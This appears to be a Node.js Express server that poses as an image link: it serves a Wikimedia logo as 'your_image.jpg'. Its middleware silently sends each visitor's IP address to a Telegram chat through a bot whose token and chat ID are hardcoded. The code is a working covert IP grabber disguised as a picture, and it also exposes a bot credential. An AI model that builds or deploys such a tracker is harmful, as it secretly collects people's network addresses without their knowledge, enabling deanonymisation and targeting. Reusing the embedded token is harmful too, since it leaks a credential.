const express = require('express');
const app = express();
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api'); // Import the Telegram Bot library

// Use the 'trust proxy' setting to capture client's IP behind proxy
app.set('trust proxy', true);

// Initialize the Telegram Bot with your bot token
const bot = new TelegramBot('6985024526:AAFdGkUe-T6Nm1MAwDU4S9Ci-Y100bloN5A', { polling: false });

app.use((req, res, next) => {
    const clientIp = req.ip || req.headers['x-forwarded-for']; // Capture client's IP
    console.log(`IP-адрес посетителя: ${clientIp}`);

    // Send the client's IP address to your Telegram bot
    bot.sendMessage('565711735', `Client IP: ${clientIp}`)
        .then(() => {
            console.log('IP sent to Telegram bot');
        })
        .catch((error) => {
            console.error('Error sending IP to Telegram bot:', error);
        });

    next();
});

app.get('/', async (req, res) => {
    const imageUrl = 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Kazdream_logo.svg/750px-Kazdream_logo.svg.png';

    try {
        const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        res.setHeader('Content-Type', 'image/jpeg');
        res.setHeader('Content-Disposition', 'inline; filename=your_image.jpg');
        res.send(Buffer.from(response.data, 'binary'));
    } catch (error) {
        console.error(error);
        res.status(500).send('Ошибка загрузки изображения');
    }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});

module.exports = app;
